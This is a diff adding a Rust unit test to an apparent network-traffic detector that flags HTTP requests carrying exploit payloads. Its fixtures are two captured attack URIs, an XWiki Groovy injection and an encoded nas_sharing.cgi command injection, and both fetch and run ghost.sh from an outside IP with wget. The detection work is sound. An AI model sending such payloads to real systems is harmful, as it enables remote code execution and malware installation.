@@ -536,3 +536,45 @@ pub fn tls_with_no_server_name_to_a_bare_address_is_low() {
     resolved.frame(FrameKind::Session, &hello, "129.151.184.17", "443");
     assert!(!has(&resolved.finish(), "network.tls_ip_literal"));
 }
+
+#[test]
+pub fn http_requests_carrying_a_download_command_are_exploits() {
+    // A15, run 122797288: an xwiki Groovy injection and a nas_sharing.cgi
+    // command in base64 of hex escapes, both fetching ghost.sh.
+    let xwiki = "/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D+%7B%7Bgroovy%7D%7D+println%28%22cd+%2Ftmp%3B+wget+http%3A%2F%2F94.154.43.158%2Fghost.sh%3B+chmod+777+ghost.sh%3B+sh+ghost.sh%22.execute%28%29%29";
+    let nas = "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobyAtZSBceDc3XHg2N1x4NjVceDc0XHgyMFx4NjhceDc0XHg3NFx4NzBceDNhXHgyZlx4MmZceDM5XHgzNFx4MmVceDMxXHgzNVx4MzRceDJlXHgzNFx4MzNceDJlXHgzMVx4MzVceDM4XHgyZlx4NjdceDY4XHg2Zlx4NzNceDc0XHgyZVx4NzNceDY4";
+    assert!(super::super::frames::exploit_payload(xwiki)
+        .is_some_and(|command| command.starts_with("wget http://94.154.43.158/ghost.sh")));
+    assert!(
+        super::super::frames::exploit_payload(nas)
+            .is_some_and(|command| command.contains("ghost.sh")),
+        "{:?}",
+        super::super::frames::exploit_payload(nas)
+    );
+    let mut capture = Capture::new();
+    for (frame, uri) in [(1, xwiki), (2, nas), (3, xwiki)] {
+        capture.frame(
+            FrameKind::Http,
+            &http(frame, frame, "22.0.108.58:8080", uri),
+            "22.0.108.58",
+            "8080",
+        );
+    }
+    let out = capture.finish();
+    let row = rows(&out, "lateral.exploit_payload");
+    assert_eq!(row.len(), 1);
+    assert_eq!(text(row[0], "finding.tier"), "high");
+    assert_eq!(count(row[0]), 3);
+    // An ordinary download link is not.
+    for benign in [
+        "/download?file=wget-1.21.tar.gz",
+        "/docs/curl.html",
+        "/search?q=how+to+use+wget",
+    ] {
+        assert_eq!(
+            super::super::frames::exploit_payload(benign),
+            None,
+            "{benign}"
+        );
+    }
+}
